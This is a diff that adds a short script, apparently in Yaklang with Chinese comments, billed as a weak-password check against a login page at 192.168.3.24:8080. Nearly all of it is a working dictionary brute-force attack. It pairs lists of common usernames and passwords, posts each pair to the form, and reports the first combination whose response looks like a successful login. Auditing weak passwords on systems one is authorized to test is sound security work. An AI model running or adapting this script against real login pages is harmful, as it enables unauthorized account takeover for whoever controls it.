@@ -1,0 +1,62 @@
+# 弱口令检测脚本 - 针对 http://192.168.3.24:8080/login.php
+
+// 常见弱口令字典
+common_passwords = [
+    "admin", "123456", "password", "12345678", "qwerty", 
+    "123456789", "letmein", "1234567", "football", "iloveyou",
+    "admin123", "welcome", "monkey", "login", "abc123",
+    "111111", "123123", "password123", "admin@123", "root"
+]
+
+common_users = [
+    "admin", "root", "user", "test", "guest", 
+    "administrator", "manager", "operator"
+]
+
+// 目标URL
+target = "http://192.168.3.24:8080/login.php"
+
+// 发送登录请求函数
+bruteLogin = (username, password) => {
+    rsp, req, err = poc.Post(target, 
+        poc.replaceHeader("Content-Type", "application/x-www-form-urlencoded"),
+        poc.replaceBody(sprintf("username=%s&password=%s", codec.EncodeUrl(username), codec.EncodeUrl(password)))
+    )
+    if err != nil {
+        return false, err
+    }
+    
+    body = string(rsp.GetBody())
+    // 检查登录成功特征（根据实际响应调整）
+    if str.Contains(body, "welcome") || str.Contains(body, "success") || 
+       str.Contains(body, "dashboard") || str.Contains(body, "index") ||
+       rsp.GetStatusCode() == 302 {
+        return true, nil
+    }
+    return false, nil
+}
+
+// 执行弱口令检测
+found = false
+for _, user := range common_users {
+    for _, pass := range common_passwords {
+        success, err = bruteLogin(user, pass)
+        if err != nil {
+            log.error("请求失败: %v", err)
+            continue
+        }
+        if success {
+            log.info("[+] 发现弱口令! 用户名: %s, 密码: %s", user, pass)
+            found = true
+            break
+        }
+        log.debug("测试失败: %s:%s", user, pass)
+    }
+    if found {
+        break
+    }
+}
+
+if !found {
+    log.info("[-] 未发现常见弱口令")
+}
